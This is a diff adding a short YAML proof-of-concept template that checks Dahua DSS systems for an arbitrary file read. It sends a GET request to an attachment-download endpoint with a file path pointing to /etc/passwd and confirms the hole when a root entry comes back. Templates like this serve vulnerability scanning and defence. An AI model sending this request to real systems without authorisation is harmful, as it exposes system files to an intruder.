@@ -1,0 +1,8 @@
+name: dahua-dss-file-read
+rules:
+  - method: GET
+    path: "/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd"
+    expression: |
+      response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+detail:
+  author: 666
